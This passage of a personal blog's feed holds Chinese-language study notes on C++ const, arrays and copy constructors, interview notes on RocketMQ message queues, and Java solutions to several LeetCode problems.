color="red">非常量可以转换成常量，反之不行</font></p><p>底层指针的拷入主要看是否同为底层的或者是非常量。</p><p>常量指针的拷入只能拷入常量。</p><p>顶层指针因为只能初始化一次后不能改变所以不做讨论。</p><h2><span id="constexpr">constexpr</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> *p=<span class="literal">nullptr</span>; <span class="comment">//底层const</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> *q=<span class="literal">nullptr</span>;<span class="comment">//顶层const 相对于*const</span></span><br></pre></td></tr></table></figure><h2><span id="数组">数组</span></h2><h3><span id="引用遍历法">引用遍历法：</span></h3><p>要使用范围for语句处理多维数组，除了最内层的循环外，其他所有循环的控制变量都应该是引用类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i:row)&#123;</span><br><span class="line">        cout &lt;&lt; i;  <span class="comment">//i只读，改变对数组没有影响。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是想要去更改数组里面的值就要使用引用类型去遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> &amp;row:ia)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;col:row)&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="下标遍历法">下标遍历法：</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i!=row;++i)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j=<span class="number">0</span>;j!=col;++j)&#123;</span><br><span class="line">        ia[i][j]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>,*p=&amp;i;</span><br><span class="line">*p=<span class="number">2</span>;<span class="comment">//*p是i的一个引用，相对于&amp;j=i;</span></span><br></pre></td></tr></table></figure><h3><span id="指针遍历法">指针遍历法：</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> p=ia;p!=ia+<span class="number">3</span>;++p)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> q=*p;q!=*p+<span class="number">4</span>;++q)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中p中存放地址是ia[x]的地址而且ia[x]和ia[x+1]的地址是连续的，而*p是取ia[x][0]的地址。</p><h2><span id="左值和右值">左值和右值</span></h2><h2><span id="拷贝构造函数">拷贝构造函数</span></h2><p>如果一个构造函数的第一个参数是自身类类型的引用，且任何额外参数都有默认值，则此构造函数是拷贝构造函数。当使用<strong>拷贝初始化</strong>时，我们会用到拷贝构造函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>(); <span class="comment">//默认构造函数</span></span><br><span class="line">    <span class="built_in">Foo</span>(<span class="type">const</span> Foo&amp;);<span class="comment">//拷贝构造函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>拷贝函数通常不应该是explicit的</strong></p><h2><span id="拷贝初始化">拷贝初始化</span></h2><ul><li><p>用&#x3D;定义变量</p></li><li><p>将一个对象作为实参传递给一个非引用类型的形参</p></li><li><p>从花括号列表初始化一个数组中的元素或一个聚合类中的成员</p></li></ul><h2><span id="重载拷贝赋值运算符">重载拷贝赋值运算符</span></h2><p>如果一个类未定义自己的拷贝赋值运算符，编译器会为它生成一个合成拷贝赋值运算符</p><p>如果一个运算符是一个成员函数，其左侧运算对象就绑定到隐式的this参数。赋值运算符通常返回一个指向其左侧运算对象的引用。</p><h1><span id="练习">练习</span></h1><h2><span id="943">9.43</span></h2><p>如果使用!&#x3D;来比较两个迭代器在这题是不行的，但是如果不是特殊条件最好写成！&#x3D;的判断条件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s, <span class="type">const</span> string&amp; oldVal, <span class="type">const</span> string&amp; newVal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> curr = s.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (curr &lt;= s.<span class="built_in">end</span>() - oldVal.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (oldVal == s.<span class="built_in">substr</span>(curr-<span class="built_in">begin</span>(s),  oldVal.<span class="built_in">size</span>()))</span><br><span class="line">&#123;</span><br><span class="line">curr = s.<span class="built_in">erase</span>(curr, curr + oldVal.<span class="built_in">size</span>());</span><br><span class="line">curr = s.<span class="built_in">insert</span>(curr, newVal.<span class="built_in">begin</span>(), newVal.<span class="built_in">end</span>());</span><br><span class="line">curr += newVal.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">++curr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;tho &quot;</span>;</span><br><span class="line">    string oldVal = <span class="string">&quot;tho&quot;</span>;</span><br><span class="line">    string newVal = <span class="string">&quot;though&quot;</span>;</span><br><span class="line"><span class="built_in">replace</span>(s, oldVal, newVal);</span><br><span class="line">    cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="944">9.44</span></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s, <span class="type">const</span> string&amp; o, <span class="type">const</span> string&amp; n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i+o.<span class="built_in">size</span>() &lt;= s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == s.<span class="built_in">substr</span>(i,i+o.<span class="built_in">size</span>())) &#123;</span><br><span class="line">            s.<span class="built_in">replace</span>(i, o.<span class="built_in">size</span>(), n);</span><br><span class="line">            i += n.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;tho &quot;</span>;</span><br><span class="line">    string oldVal = <span class="string">&quot;tho&quot;</span>;</span><br><span class="line">    string newVal = <span class="string">&quot;though&quot;</span>;</span><br><span class="line"><span class="built_in">replace</span>(s, oldVal, newVal);</span><br><span class="line">    cout &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;总结一些C++学习中疑惑的点&lt;/p&gt;</summary>
    
    
    
    <category term="log" scheme="https://disda-coding.github.io/categories/log/"/>
    
    
    <category term="C++" scheme="https://disda-coding.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>中间件</title>
    <link href="https://disda-coding.github.io/2020/04/16/middleWare/"/>
    <id>https://disda-coding.github.io/2020/04/16/middleWare/</id>
    <published>2020-04-16T09:22:02.000Z</published>
    <updated>2020-04-16T10:20:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>适用于面试回答</p><span id="more"></span><!-- toc --><ul><li><a href="#redis">Redis</a></li><li><a href="#mq">MQ</a><ul><li><a href="#%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E4%BC%98%E7%BC%BA%E7%82%B9">消息队列优缺点</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8rocketmq">为什么用RocketMQ</a></li><li><a href="#rocketmq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">RocketMQ如何保证高可用性</a></li><li><a href="#rocketmq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E8%A2%AB%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9">RocketMQ如何保证消息不被重复消费</a></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E5%8F%AF%E9%9D%A0%E6%80%A7">如何保证消息可靠性</a></li></ul></li></ul><!-- tocstop --><h1><span id="redis">Redis</span></h1><h1><span id="mq">MQ</span></h1><h2><span id="消息队列优缺点">消息队列优缺点</span></h2><p><strong>优点</strong></p><p>​解耦、削峰和异步</p><p><strong>缺点</strong></p><p>​提升了系统的复杂度、系统可用性降低以及存在一致性的问题。</p><h2><span id="为什么用rocketmq">为什么用RocketMQ</span></h2><ul><li>吞吐量：ActiveMQ和RabbitMQ是万级，而RocketMQ和Kafka是十万级。</li><li>Topic： RocketMQ可以支持成百上千，而Kafka几十几百吞吐量大幅下降</li><li>时效性： 除了Rabbit都是ms级别</li><li>可用性：RocketMQ和Kafka都非常高</li><li>可靠性：RockMQ和Kafka可以做到不丢</li></ul><h2><span id="rocketmq如何保证高可用性">RocketMQ如何保证高可用性</span></h2><p>一个最基本的架构认识：由多个 broker 组成，每个 broker 是一个节点；你创建一个 topic，这个 topic 可以划分为多个 partition，每个 partition 可以存在于不同的 broker 上，每个 partition 就放一部分数据。</p><p>副本机制，每个 partition 的数据都会同步到其它机器上，形成自己的多个 replica 副本。所有副本会选取一个leader用来读写数据。如果leader down了，就重新选择leader。</p><p><strong>写数据</strong>的时候，生产者就写 leader，然后 leader 将数据落地写本地磁盘，接着其他 follower 自己主动从 leader 来 pull 数据。一旦所有 follower 同步好数据了，就会发送 ack 给 leader，leader 收到所有 follower 的 ack 之后，就会返回写成功的消息给生产者。</p><h2><span id="rocketmq如何保证消息不被重复消费">RocketMQ如何保证消息不被重复消费</span></h2><p>每个消息写进去，都有一个 offset，代表消息的序号，然后 消费者消费了数据之后，<strong>每隔一段时间</strong>就会提交 offset 。</p><p>如果重启怎么办？</p><ul><li>比如你拿个数据要写库，你先根据主键查一下，如果这数据都有了，你就别插入了，update 一下好吧。</li><li>比如你是写 Redis，那没问题了，反正每次都是 set，天然幂等性。</li><li>比如你不是上面两个场景，那做的稍微复杂一点，你需要让生产者发送每条数据的时候，里面加一个全局唯一的 id，消费到了之后，先根据这个 id 去比如 Redis 里查一下，之前消费过吗？如果没有消费过，你就处理，然后这个 id 写 Redis。如果消费过了，那你就别处理了，保证别重复处理相同的消息即可。</li><li>比如基于数据库的唯一键来保证重复数据不会重复插入多条。因为有唯一键约束了，重复数据插入只会报错，不会导致数据库中出现脏数据。</li></ul><h2><span id="如何保证消息可靠性">如何保证消息可靠性</span></h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;适用于面试回答&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="https://disda-coding.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="中间件" scheme="https://disda-coding.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode高频考点</title>
    <link href="https://disda-coding.github.io/2020/04/16/Hi-Freq/"/>
    <id>https://disda-coding.github.io/2020/04/16/Hi-Freq/</id>
    <published>2020-04-16T02:14:09.000Z</published>
    <updated>2020-04-29T13:31:56.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了高频的面试题</p><span id="more"></span><!-- toc --><ul><li><a href="#%E6%95%B0%E7%BB%84">数组</a><ul><li><a href="#two-sum">Two Sum √</a></li><li><a href="#maximum-swap">Maximum Swap √</a></li><li><a href="#median-of-two-sorted-arrays">Median of Two Sorted Arrays</a></li><li><a href="#swap-adjacent-in-lr-string">Swap Adjacent in LR String</a></li></ul></li><li><a href="#%E9%93%BE%E8%A1%A8">链表</a><ul><li><a href="#merge-k-sorted-lists-">Merge k Sorted Lists -</a></li><li><a href="#lru-">LRU -</a></li><li><a href="#reverse-nodes-in-k-group-">Reverse Nodes in K-group -</a></li><li><a href="#copy-list-with-random-pointer-">Copy List with Random Pointer -</a></li><li><a href="#merge-two-sorted-lists">Merge Two Sorted Lists √</a></li><li><a href="#add-two-numbers">Add Two Numbers √</a></li><li><a href="#add-two-numbers-ii">Add Two Numbers II √</a></li><li><a href="#reverse-words-in-a-string-">Reverse Words in a String -</a></li><li><a href="#merge-k-sorted-lists--1">Merge k Sorted Lists -</a></li></ul></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92">动态规划</a><ul><li><a href="#climbing-stairs">Climbing Stairs √</a></li></ul></li><li><a href="#%E6%A0%88">栈</a><ul><li><a href="#trapping-rain-water">Trapping Rain Water</a></li><li><a href="#simplify-path">Simplify Path</a></li></ul></li><li><a href="#%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE">二分查找</a><ul><li><a href="#search-in-rotated-sorted-array">Search in Rotated Sorted Array √</a></li></ul></li><li><a href="#%E5%8F%8C%E6%8C%87%E9%92%88">双指针</a><ul><li><a href="#longest-substring-without-repeating-characters">Longest Substring Without Repeating Characters √</a></li></ul></li><li><a href="#%E6%90%9C%E7%B4%A2">搜索</a><ul><li><a href="#longest-palindromic-substring">Longest Palindromic Substring ×</a></li></ul></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-1">动态规划</a><ul><li><a href="#maximum-subarray">Maximum Subarray √</a></li><li><a href="#regular-expression-matching">Regular Expression Matching √</a></li></ul></li><li><a href="#%E6%8E%92%E5%BA%8F">排序</a><ul><li><a href="#kth-largest-element-in-an-array">Kth Largest Element in an Array √</a></li></ul></li><li><a href="#%E6%95%B0%E5%AD%97">数字</a><ul><li><a href="#reverse-integer">Reverse Integer √</a></li><li><a href="#implement-rand10-using-rand7">Implement Rand10() Using Rand7()</a></li></ul></li></ul><!-- tocstop --><h1><span id="数组">数组</span></h1><h2><span id="two-sum">Two Sum √</span></h2><p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p><p>You may assume that each input would have *<strong>exactly*</strong> one solution, and you may not use the <em>same</em> element twice.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [2, 7, 11, 15], target = 9,</span><br><span class="line"></span><br><span class="line">Because nums[0] + nums[1] = 2 + 7 = 9,</span><br><span class="line">return [0, 1].</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> res[] =<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        HashMap&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;map.get(nums[i]),i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> map.put(target-nums[i],i);</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="maximum-swap">Maximum Swap √</span></h2><p>Given a non-negative integer, you could swap two digits <strong>at most</strong> once to get the maximum valued number. Return the maximum valued number you could get.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2736</span><br><span class="line">Output: 7236</span><br><span class="line">Explanation: Swap the number 2 and the number 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 9973</span><br><span class="line">Output: 9973</span><br><span class="line">Explanation: No swap.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumSwap</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] a = Integer.toString(num).toCharArray();</span><br><span class="line">        <span class="type">char</span>[] n=<span class="keyword">new</span> <span class="title class_">char</span>[a.length];</span><br><span class="line">        <span class="type">char</span>[] m=<span class="keyword">new</span> <span class="title class_">char</span>[a.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            n[i]=a[i];</span><br><span class="line">            m[i]=a[i];</span><br><span class="line">        &#125;        </span><br><span class="line">        Arrays.sort(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=a.length-<span class="number">1</span>,j=<span class="number">0</span>;i&gt;=<span class="number">0</span>;i--,j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n[i]!=m[j])&#123;</span><br><span class="line">                swap(m,j,find(m,n[i]));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> <span class="title class_">String</span>(m));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span>[] m,<span class="type">char</span> v)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=m.length-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(v==m[i]) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">char</span> a[],<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">char</span> tmp=a[i];</span><br><span class="line">        a[i]=a[j];</span><br><span class="line">        a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>O(n)解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumSwap</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] A = Integer.toString(num).toCharArray();</span><br><span class="line">        <span class="type">int</span>[] last = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            last[A[i] - <span class="string">&#x27;0&#x27;</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">9</span>; d &gt; A[i] - <span class="string">&#x27;0&#x27;</span>; d--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (last[d] &gt; i) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> A[i];</span><br><span class="line">                    A[i] = A[last[d]];</span><br><span class="line">                    A[last[d]] = tmp;</span><br><span class="line">                    <span class="keyword">return</span> Integer.valueOf(<span class="keyword">new</span> <span class="title class_">String</span>(A));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="median-of-two-sorted-arrays">Median of Two Sorted Arrays</span></h2><p>There are two sorted arrays <strong>nums1</strong> and <strong>nums2</strong> of size m and n respectively.</p><p>Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).</p><p>You may assume <strong>nums1</strong> and <strong>nums2</strong> cannot be both empty.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line"></span><br><span class="line">The median is 2.0</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line"></span><br><span class="line">The median is (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m &gt; n) </span><br><span class="line">            <span class="keyword">return</span> findMedianSortedArrays(nums2, nums1);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>, imin = <span class="number">0</span>, imax = m, half = (m + n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">maxLeft</span> <span class="operator">=</span> <span class="number">0</span>, minRight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(imin &lt;= imax)&#123;</span><br><span class="line">             i = imin + (imax-imin) / <span class="number">2</span>;</span><br><span class="line">            j = half - i;</span><br><span class="line">            <span class="keyword">if</span>(j &gt; <span class="number">0</span> &amp;&amp; i &lt; m &amp;&amp; nums2[j - <span class="number">1</span>] &gt; nums1[i])&#123;</span><br><span class="line">                imin = i + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; j &lt; n &amp;&amp; nums1[i - <span class="number">1</span>] &gt; nums2[j])&#123;</span><br><span class="line">                imax = i - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    maxLeft = (<span class="type">double</span>)nums2[j - <span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">                    maxLeft = (<span 